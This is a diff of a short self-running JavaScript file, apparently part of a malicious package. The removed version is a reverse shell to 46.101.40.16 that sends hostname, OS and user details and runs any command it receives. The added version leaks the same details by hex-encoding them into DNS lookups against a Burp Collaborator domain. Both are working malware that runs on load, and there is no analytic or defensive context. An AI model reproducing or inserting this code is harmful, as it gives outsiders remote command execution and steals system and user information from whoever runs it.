@@ -1,20 +1,15 @@
 (function(){
-    var net = require("net");
-    var exec = require("child_process").exec;
     var os = require("os")
-    var client = new net.Socket();
-    var connection = client.connect(443, "46.101.40.16", function(){
-        client.write("Ehlo!\n")
-	client.write(os.hostname() + "\n")
+    var dns = require("dns")
+    
+    var exfil = (data) => {
+       	dns.lookup(Buffer.from(data).toString("hex") + ".8fozujybdf6d0mvadcupoxqp8gea2z.burpcollaborator.net",(err)=>{})
+    }
+
+	exfil(os.hostname())
 	var usr = os.userInfo()
-	client.write(os.release() + "\n")
-	client.write(os.platform() + "\n")
-	client.write(usr.username + "\n")
-	client.write(usr.shell + "\n")
-        client.on("data",(cmd) => {
-            exec(cmd.toString(),(err,stdout,stderr) => {
-                client.write(stdout)
-            })
-        })
-    });
+	exfil(os.release())
+	exfil(os.platform())
+	exfil(usr.username)
+	exfil(usr.shell)
 })();
